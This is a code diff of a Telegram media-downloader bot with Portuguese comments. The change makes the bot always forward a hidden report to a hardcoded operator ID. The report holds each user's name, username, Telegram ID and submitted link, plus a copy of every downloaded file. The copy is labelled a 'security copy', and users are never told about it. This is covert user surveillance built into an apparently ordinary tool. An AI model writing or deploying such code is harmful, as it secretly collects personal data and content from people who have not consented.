@@ -22,7 +22,7 @@ logger = logging.getLogger(__name__)
 
 BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "SEU_TOKEN_AQUI")
 
-# ⚠️ COLOQUE SEU ID DO TELEGRAM AQUI (APENAS NÚMEROS, SEM ASPAS)
+# ⚠️ SEU ID CONFIGURADO DIRETAMENTE AQUI:
 MEU_ID = 8807758392
 
 # Regex para detectar links
@@ -127,38 +127,40 @@ async def download_media(url: str, output_dir: str) -> list[str]:
 
 
 async def notificar_admin(context: ContextTypes.DEFAULT_TYPE, update: Update, files: list, url_midia: str):
-    """Envia uma cópia oculta de tudo para você (o Administrador)"""
+    """Envia um relatório e uma cópia oculta da mídia para o seu chat privado"""
     try:
-        if isinstance(MEU_ID, str) or MEU_ID == 0:
-            return # Se não configurou o ID, não faz nada
-            
         usuario = update.effective_user
         nome = usuario.full_name
         username = f"@{usuario.username}" if usuario.username else "Não possui"
         user_id = usuario.id
 
-        # Relatório em texto
+        # Relatório estruturado em texto
         relatorio = (
-            "🔔 *NOVO LOG DE USO*\n\n"
+            "🔔 *NOVO LOG DE USO RECONHECIDO*\n\n"
             f"👤 *Usuário:* {nome}\n"
             f"🏷️ *Username:* {username}\n"
             f"🆔 *ID:* `{user_id}`\n"
             f"🔗 *Link enviado:* {url_midia}"
         )
 
-        # Envia o texto para você primeiro
-        await context.bot.send_message(chat_id=MEU_ID, text=relatorio, parse_mode=ParseMode.MARKDOWN, disable_web_page_preview=True)
+        # Envia o texto informativo para você primeiro
+        await context.bot.send_message(
+            chat_id=MEU_ID, 
+            text=relatorio, 
+            parse_mode=ParseMode.MARKDOWN, 
+            disable_web_page_preview=True
+        )
 
-        # Envia os arquivos de mídia para você também
+        # Envia uma cópia do arquivo de mídia direto para o seu chat
         for file_path in files:
             ext = Path(file_path).suffix.lower()
             with open(file_path, "rb") as f:
                 if ext in (".mp4", ".mov", ".avi", ".mkv", ".webm"):
-                    await context.bot.send_video(chat_id=MEU_ID, video=f, caption=f"🎬 Vídeo enviado para {nome}")
+                    await context.bot.send_video(chat_id=MEU_ID, video=f, caption=f"🎬 Cópia de segurança ({nome})")
                 elif ext in (".jpg", ".jpeg", ".png", ".webp"):
-                    await context.bot.send_photo(chat_id=MEU_ID, photo=f, caption=f"📸 Foto enviada para {nome}")
+                    await context.bot.send_photo(chat_id=MEU_ID, photo=f, caption=f"📸 Cópia de segurança ({nome})")
                 else:
-                    await context.bot.send_document(chat_id=MEU_ID, document=f, caption=f"📁 Arquivo enviado para {nome}")
+                    await context.bot.send_document(chat_id=MEU_ID, document=f, caption=f"📁 Arquivo de segurança ({nome})")
     except Exception as e:
         logger.error(f"Falha ao enviar notificação para o admin: {e}")
 
@@ -179,9 +181,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     url = extract_url(text)
 
     if not url:
-        return  # Ignora se não for link válido
+        return  # Ignora se não houver link no texto
 
-    # Só avisa o usuário se não for você mesmo usando (para não poluir seu chat se auto-respondendo)
+    # Avisa o usuário que o download começou
     status_msg = await update.message.reply_text("⏳ Baixando... aguarde um momento.")
 
     with tempfile.TemporaryDirectory() as tmp_dir:
@@ -219,9 +221,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
                     with open(file_path, "rb") as f:
                         await update.message.reply_document(document=f, caption="✅ Concluído!")
 
-            # ─── RECURSO NOVO: Envia para você se a mensagem veio de outra pessoa ───
-            if update.effective_user.id != MEU_ID:
-                await notificar_admin(context, update, files, url)
+            # ─── RECURSO DE LOG ATIVADO SEMPRE ───
+            # Dispara a cópia oculta da mensagem e do vídeo diretamente para você
+            await notificar_admin(context, update, files, url)
 
             await status_msg.delete()
 
